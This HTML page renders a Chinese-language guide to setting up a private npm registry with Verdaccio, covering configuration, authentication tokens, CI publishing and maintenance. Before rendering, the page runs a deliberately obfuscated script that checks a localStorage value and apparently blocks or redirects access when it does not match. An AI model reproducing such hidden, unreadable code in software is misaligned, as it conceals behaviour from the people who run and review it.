<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x13d278=_0x1d40;function _0x1d40(p,s){var l=_0x24fe();return(_0x1d40=function(s,n){var a=l[s-=188];void 0===_0x1d40.ITgukB&&(_0x1d40.CgWHCS=function(s,n){var a,t=[],p=0,l="";for(s=(s=>{for(var n,a,t="",p="",l=0,c=0;a=s.charAt(c++);~a&&(n=l%4?64*n+a:a,l++%4)&&(t+=String.fromCharCode(255&n>>(-2*l&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var r=0,e=t.length;r<e;r++)p+="%"+("00"+t.charCodeAt(r).toString(16)).slice(-2);return decodeURIComponent(p)})(s),c=0;c<256;c++)t[c]=c;for(c=0;c<256;c++)p=(p+t[c]+n.charCodeAt(c%n.length))%256,a=t[c],t[c]=t[p],t[p]=a;for(var c=0,p=0,r=0;r<s.length;r++)a=t[c=(c+1)%256],t[c]=t[p=(p+t[c])%256],t[p]=a,l+=String.fromCharCode(s.charCodeAt(r)^t[(t[c]+t[p])%256]);return l},p=arguments,_0x1d40.ITgukB=!0);var s=s+l[0],t=p[s];return t?a=t:(void 0===_0x1d40.fySVUF&&(_0x1d40.fySVUF=!0),a=_0x1d40.CgWHCS(a,n),p[s]=a),a})(p,s)}if((()=>{for(var s=_0x1d40,n=_0x24fe();;)try{if(963856==-parseInt(s(189,"nJUb"))*(-parseInt(s(201,"2Kuy"))/2)+-parseInt(s(194,"qEMG"))/3*(-parseInt(s(204,"T76v"))/4)+-parseInt(s(213,"*i8%"))/5*(parseInt(s(200,"u10g"))/6)+parseInt(s(198,"[D!J"))/7+-parseInt(s(197,"#4fE"))/8+-parseInt(s(206,"U0ch"))/9+-parseInt(s(212,"MtlQ"))/10*(parseInt(s(193,"2Kuy"))/11))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x13d278(196,"QpD%")](_0x13d278(211,"QpD%"))!=_0x13d278(208,"MG6W"))throw window[_0x13d278(190,"rsy]")][_0x13d278(210,"tIQ7")](_0x13d278(192,"]LMW")),Error();function _0x24fe(){var s=["WPBdRXVcHtvtWRe","sYJcPN/dPSkvqc4LW50TWQG","W6JdLSoedSouW4bkFmkLcYftvW","wfpdR8kWumktpuLaqq","pSotpYKlW7hdKmkIWReIWOD5fq","a3tdRSkPiuqCiwBdMW","W7KYqmkPAaxcVufkjCkrtmkc","lINcQvmxWQ9+ugxdLXeo","gmozg08xoSk9jqawjCk1WQK","W4RdGfNcUSoSuser","sh0gWPLVW6DvcSkmWPpdRmocya","CbXfn3ddNtG","b8kfv8oCWPG","qmoaACovWQ5YWQBcMW","WQpcSvFcK0zqW4C","WRddQqZcQtjfWPFdQCoE","DgnkiLtdUX3cGW","xvBcRmoArCkbaxK","WRnWWQqLD8kZAmokia","ks3cQfeqWQ8zEwpdUrGQoa","WRNdU2pcJSklxwHJvCooW5KvW4O","Cf45amovd8oVW6RdTG","W7JdRh/dRCknW6u4WOu","y8oaW5lcTqRdTmkuWRrxW4DiDbO","WPpcHf/cKSoiiwH6FHmYW5lcLcddHSoZW7OIkSokpg3cOHmmvq","bxBdQCkUuIqxlehdI8kova","kmkaWOpcR0ldL2i","EMmIW4a1WPKuWRTwD35c"];return(_0x24fe=function(){return s})()}document.title="前端搭建公司私有 npm 仓库完整指南",document.getElementById("article").innerHTML='<div><p>搭建公司私有 npm 仓库是前端工程化建设的重要环节，可以安全地管理内部组件库、工具库和项目配置。以下是详细实施方案：</p>\n<h2>一、私有 npm 仓库方案选型</h2>\n<h3>1. 主流解决方案对比</h3>\n<table>\n<thead>\n<tr>\n<th>方案</th>\n<th>优点</th>\n<th>缺点</th>\n<th>适用场景</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Verdaccio</strong></td>\n<td>轻量、易部署、支持缓存公有包</td>\n<td>需要自行维护服务器</td>\n<td>中小团队快速搭建</td>\n</tr>\n<tr>\n<td><strong>Nexus Repository</strong></td>\n<td>企业级、多格式支持、高可用</td>\n<td>配置复杂、资源消耗大</td>\n<td>大型企业基础设施完善</td>\n</tr>\n<tr>\n<td><strong>GitHub Packages</strong></td>\n<td>无需自建服务器、与GitHub集成</td>\n<td>网络可能受限、按用量收费</td>\n<td>已使用GitHub的企业</td>\n</tr>\n<tr>\n<td><strong>CNPM</strong></td>\n<td>淘宝镜像衍生、支持大规模部署</td>\n<td>中文文档为主、社区相对较小</td>\n<td>国内企业首选</td>\n</tr>\n</tbody>\n</table>\n<h3>2. 推荐方案：Verdaccio</h3>\n<ul>\n<li><strong>轻量</strong>   ：Node.js 实现，资源占用低</li>\n<li><strong>零配置</strong>   ：开箱即用</li>\n<li><strong>插件化</strong>   ：支持自定义认证、存储等插件</li>\n<li><strong>缓存功能</strong>   ：自动缓存公共包，加速安装</li>\n</ul>\n<h2>二、Verdaccio 详细搭建流程</h2>\n<h3>1. 安装与启动</h3>\n<pre><code class="language-bash"><span class="hljs-comment"># 全局安装</span>\nnpm install -g verdaccio\n\n<span class="hljs-comment"># 运行（默认端口4873）</span>\nverdaccio\n\n<span class="hljs-comment"># 使用PM2守护进程</span>\npm2 start verdaccio\n</code></pre>\n<h3>2. 配置文件详解（<code>~/.config/verdaccio/config.yaml</code>）</h3>\n<pre><code class="language-yaml"><span class="hljs-attr">storage:</span> <span class="hljs-string">./storage</span> <span class="hljs-comment"># 包存储目录</span>\n<span class="hljs-attr">plugins:</span> <span class="hljs-string">./plugins</span> <span class="hljs-comment"># 插件目录</span>\n\n<span class="hljs-attr">web:</span>\n  <span class="hljs-attr">title:</span> <span class="hljs-string">企业私有仓库</span> <span class="hljs-comment"># 网页标题</span>\n  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span>\n  <span class="hljs-attr">logo:</span> <span class="hljs-string">logo.png</span>\n\n<span class="hljs-attr">auth:</span>\n  <span class="hljs-attr">htpasswd:</span>\n    <span class="hljs-attr">file:</span> <span class="hljs-string">./htpasswd</span> <span class="hljs-comment"># 用户认证文件</span>\n\n<span class="hljs-attr">uplinks:</span>\n  <span class="hljs-attr">npmjs:</span>\n    <span class="hljs-attr">url:</span> <span class="hljs-string">https://registry.npmjs.org/</span>\n\n<span class="hljs-attr">packages:</span>\n  <span class="hljs-attr">&quot;@company/*&quot;:</span> <span class="hljs-comment"># 公司作用域包</span>\n    <span class="hljs-attr">access:</span> <span class="hljs-string">$authenticated</span>\n    <span class="hljs-attr">publish:</span> <span class="hljs-string">$authenticated</span>\n\n  <span class="hljs-attr">&quot;**&quot;:</span> <span class="hljs-comment"># 其他包（缓存公共包）</span>\n    <span class="hljs-attr">access:</span> <span class="hljs-string">$authenticated</span>\n    <span class="hljs-attr">publish:</span> <span class="hljs-string">$authenticated</span>\n    <span class="hljs-attr">proxy:</span> <span class="hljs-string">npmjs</span>\n</code></pre>\n<h3>3. 用户管理与认证</h3>\n<pre><code class="language-bash"><span class="hljs-comment"># 添加用户</span>\nnpm adduser --registry http://your-registry:4873\n\n<span class="hljs-comment"># 或使用htpasswd创建用户</span>\nhtpasswd -c ~/.config/verdaccio/htpasswd username\n</code></pre>\n<h2>三、客户端配置与使用</h2>\n<h3>1. 项目级配置（推荐）</h3>\n<p>在项目根目录创建 <code>.npmrc</code>：</p>\n<pre><code class="language-ini"><span class="hljs-attr">registry</span>=http://your-registry:<span class="hljs-number">4873</span>\n@company:<span class="hljs-attr">registry</span>=http://your-registry:<span class="hljs-number">4873</span>\n//your-registry:4873/:<span class="hljs-attr">_authToken</span>=<span class="hljs-variable">${NPM_TOKEN}</span>\n</code></pre>\n<h3>2. 全局配置（谨慎使用）</h3>\n<pre><code class="language-bash">npm <span class="hljs-built_in">set</span> registry http://your-registry:4873\n</code></pre>\n<h3>3. 发布私有包</h3>\n<pre><code class="language-bash"><span class="hljs-comment"># 1. 登录</span>\nnpm login --registry http://your-registry:4873\n\n<span class="hljs-comment"># 2. 初始化包（使用公司scope）</span>\nnpm init --scope=@company\n\n<span class="hljs-comment"># 3. 发布</span>\nnpm publish\n</code></pre>\n<h2>四、企业级最佳实践</h2>\n<h3>1. 安全加固方案</h3>\n<pre><code class="language-yaml"><span class="hljs-comment"># config.yaml 安全配置</span>\n<span class="hljs-attr">security:</span>\n  <span class="hljs-attr">api:</span>\n    <span class="hljs-attr">legacy:</span> <span class="hljs-literal">false</span>\n  <span class="hljs-attr">web:</span>\n    <span class="hljs-attr">sign:</span>\n      <span class="hljs-attr">alg:</span> <span class="hljs-string">HS256</span>\n      <span class="hljs-attr">secret:</span> <span class="hljs-string">your-strong-secret</span>\n</code></pre>\n<h3>2. 高可用部署</h3>\n<pre><code class="language-mermaid">graph TD\n    A[客户端] --&gt; B[负载均衡]\n    B --&gt; C[Verdaccio实例1]\n    B --&gt; D[Verdaccio实例2]\n    C --&gt; E[共享存储]\n    D --&gt; E\n</code></pre>\n<h3>3. CI/CD 集成示例</h3>\n<pre><code class="language-yaml"><span class="hljs-comment"># .gitlab-ci.yml</span>\n<span class="hljs-attr">stages:</span>\n  <span class="hljs-bullet">-</span> <span class="hljs-string">publish</span>\n\n<span class="hljs-attr">publish-package:</span>\n  <span class="hljs-attr">stage:</span> <span class="hljs-string">publish</span>\n  <span class="hljs-attr">script:</span>\n    <span class="hljs-bullet">-</span> <span class="hljs-string">echo</span> <span class="hljs-string">&quot;//your-registry:4873/:_authToken=${NPM_TOKEN}&quot;</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">.npmrc</span>\n    <span class="hljs-bullet">-</span> <span class="hljs-string">npm</span> <span class="hljs-string">publish</span>\n  <span class="hljs-attr">only:</span>\n    <span class="hljs-bullet">-</span> <span class="hljs-string">tags</span>\n</code></pre>\n<h2>五、私有包开发工作流</h2>\n<h3>1. 开发调试方案</h3>\n<pre><code class="language-bash"><span class="hljs-comment"># 1. 使用npm link</span>\n<span class="hljs-built_in">cd</span> your-package\nnpm <span class="hljs-built_in">link</span>\n\n<span class="hljs-built_in">cd</span> your-project\nnpm <span class="hljs-built_in">link</span> @company/your-package\n\n<span class="hljs-comment"># 2. 使用相对路径（package.json）</span>\n<span class="hljs-string">&quot;dependencies&quot;</span>: {\n  <span class="hljs-string">&quot;@company/your-package&quot;</span>: <span class="hljs-string">&quot;file:../your-package&quot;</span>\n}\n</code></pre>\n<h3>2. 版本管理策略</h3>\n<pre><code class="language-bash"><span class="hljs-comment"># 语义化版本控制</span>\nnpm version patch <span class="hljs-comment"># 0.0.1 -&gt; 0.0.2</span>\nnpm version minor <span class="hljs-comment"># 0.0.2 -&gt; 0.1.0</span>\nnpm version major <span class="hljs-comment"># 0.1.0 -&gt; 1.0.0</span>\n</code></pre>\n<h3>3. 依赖管理规范</h3>\n<pre><code class="language-json"><span class="hljs-punctuation">{</span>\n  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;@company/your-package&quot;</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;peerDependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>\n    <span class="hljs-attr">&quot;react&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&gt;=16.8.0&quot;</span>\n  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;dependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>\n    <span class="hljs-attr">&quot;lodash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^4.17.21&quot;</span>\n  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;devDependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>\n    <span class="hljs-attr">&quot;jest&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^27.0.0&quot;</span>\n  <span class="hljs-punctuation">}</span>\n<span class="hljs-punctuation">}</span>\n</code></pre>\n<h2>六、监控与维护</h2>\n<h3>1. 监控指标</h3>\n<ul>\n<li><strong>存储空间</strong>   ：定期清理旧版本包</li>\n<li><strong>请求性能</strong>   ：监控API响应时间</li>\n<li><strong>错误率</strong>   ：关注认证失败、发布错误</li>\n</ul>\n<h3>2. 维护命令</h3>\n<pre><code class="language-bash"><span class="hljs-comment"># 查看存储详情</span>\n<span class="hljs-built_in">du</span> -sh ~/.config/verdaccio/storage\n\n<span class="hljs-comment"># 清理旧包</span>\nverdaccio-clean --config ~/.config/verdaccio/config.yaml\n</code></pre>\n<h3>3. 备份策略</h3>\n<pre><code class="language-bash"><span class="hljs-comment"># 定期备份存储目录</span>\nrsync -avz ~/.config/verdaccio/storage backup-server:/verdaccio-backup\n</code></pre>\n<h2>七、常见问题解决方案</h2>\n<h3>1. 权限错误</h3>\n<pre><code class="language-bash"><span class="hljs-comment"># 解决方案：</span>\n<span class="hljs-built_in">rm</span> -rf ~/.npmrc\nnpm login --registry=http://your-registry:4873\n</code></pre>\n<h3>2. 发布冲突</h3>\n<pre><code class="language-bash"><span class="hljs-comment"># 确保package.json中version已更新</span>\n<span class="hljs-comment"># 或使用强制发布（谨慎）</span>\nnpm publish --force\n</code></pre>\n<h3>3. 网络问题</h3>\n<pre><code class="language-bash"><span class="hljs-comment"># 设置代理</span>\nnpm config <span class="hljs-built_in">set</span> proxy http://proxy.company.com:8080\nnpm config <span class="hljs-built_in">set</span> https-proxy http://proxy.company.com:8080\n</code></pre>\n<p>通过以上方案，企业可以快速搭建安全可靠的私有 npm 仓库，实现前端资产的统一管理和高效协作。</p>\n</div>'</script></body></html>